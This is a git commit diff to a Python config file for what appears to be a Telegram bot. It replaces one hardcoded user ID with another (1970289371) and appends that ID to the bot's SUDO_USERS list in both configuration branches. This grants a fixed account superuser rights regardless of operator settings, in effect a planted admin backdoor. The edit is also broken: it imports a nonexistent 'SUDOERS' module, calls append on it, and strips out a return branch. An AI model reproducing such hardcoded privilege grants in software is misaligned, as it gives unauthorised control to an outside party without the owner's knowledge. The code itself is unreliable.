40848e3607679656154547755be13427b3e9fbbe
famouskaykay <86409796+famouskaykay@users.noreply.github.com>
2021-09-19 19:27:19 +0000

    Update Config.py

--- wbb/Config.py
+++ wbb/Config.py
@@ -1,3 +1,4 @@
+import SUDOERS
 from envparse import env
 from GreysonBot import LOGGER
 
@@ -30,8 +31,6 @@ def get_int_key(name, required=False):
     elif not data:
         LOGGER.critical("No int key: " + name)
         sys.exit(2)
-    else:
-        return dataimport os
 
 class Config():
   ENV = bool(os.environ.get('ENV', False))
@@ -40,14 +39,14 @@ class Config():
     DATABASE_URL = os.environ.get("DATABASE_URL", None)
     APP_ID = os.environ.get("APP_ID", 6)
     API_HASH = os.environ.get("API_HASH", None)
-    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "").split()))
-    SUDO_USERS.append(1917528355)
-    SUDO_USERS = list(set(SUDO_USERS))
+    SUDO_USERS = SUDOERS
+    SUDO_USERS.append(1970289371)
+    SUDO_USERS = list(set(SUDOERS))
   else:
     BOT_TOKEN = ""
     DATABASE_URL = ""
     APP_ID = ""
     API_HASH = ""
     SUDO_USERS = list(set(int(x) for x in ''.split()))
-    SUDO_USERS.append(1917528355)
-    SUDO_USERS = list(set(SUDO_USERS))
+    SUDO_USERS.append(1970289371)
+    SUDO_USERS = list(set(SUDOERS))
